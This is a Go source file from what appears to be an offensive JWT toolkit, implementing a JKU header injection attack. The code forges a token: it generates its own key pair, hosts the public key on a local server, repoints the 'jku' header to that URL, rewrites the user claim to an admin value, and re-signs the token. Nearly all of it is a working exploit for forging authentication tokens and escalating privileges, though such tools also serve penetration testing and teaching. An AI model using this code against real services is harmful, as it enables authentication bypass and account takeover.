package attacks

import (
	"JWTechniques/ctrl"
	"fmt"
	"net/http"
	"strconv"

	"github.com/golang-jwt/jwt/v5"
)

func launchServer(port int) {
	fmt.Printf("The server is being launched on port %d\n", port)

	//Serve files from the "./files" directory
	fs := http.FileServer(http.Dir(ctrl.Directory))
	http.Handle("/", fs)

	http.ListenAndServe(":"+strconv.Itoa(port), nil)
}

//Create a token to exploit the JKU Header Injection Attack

// The process is the following :
// - Create a copy of the token,
// - Generate new public/private keys
// - Write the public key into a new file
// - Change the value of "jku" to make it point to our file
// - If possible : Change the "user" payload to elevate our privileges
// - Sign the token with the private key

// Token is a valid JWT
// url is the URL that is used to reach the user's server that will contain the file

// Return the newly created token, or an error
func generateJkuToken(token *jwt.Token, url string) (string, error) {

	tokenCpy := ctrl.CloneToken(token)
	alg := tokenCpy.Header["alg"].(string)

	//Generate private and public keys (if needed)
	publicKey, privateKey, err := ctrl.GenerateKeys(alg)
	if err != nil {
		return "", err
	}

	//Generate the JWK
	jwkContent, err := ctrl.GenerateJWK(publicKey, alg)
	if err != nil {
		return "", err
	}

	//Write the jwk into a new file
	pathToFile, err := ctrl.WriteIntoFile(alg, jwkContent)
	if err != nil {
		return "", err
	}

	//Change the value of the "JKU" header to set the path to our file containing our private key

	if url[len(url)-1] != '/' {
		url += "/"
	}
	newToken, err := ctrl.ChangeValue(tokenCpy, "jku", url+pathToFile, true)
	if err != nil {
		return "", err
	}

	//If the "user" header has been found
	//Change the value of the header to create a token with admin privs
	newToken, err = ChangeUserValue(newToken)
	if err != nil {
		return "", err
	}

	//Sign the token with our private key
	newJWT, err := newToken.SignedString(privateKey)
	if err != nil {
		return "", err
	}

	return newJWT, nil
}

// Execute the JKU Header Injection Attack, and launch the server that will serve the file
func ExploitJKU(token *jwt.Token, url string, server bool) (string, error) {

	newJWT, err := generateJkuToken(token, url)
	if err != nil {
		return "", err
	}

	fmt.Printf("JKU header injection  : %s\n\n", newJWT)

	if server {
		launchServer(12345)
	}

	return newJWT, nil
}
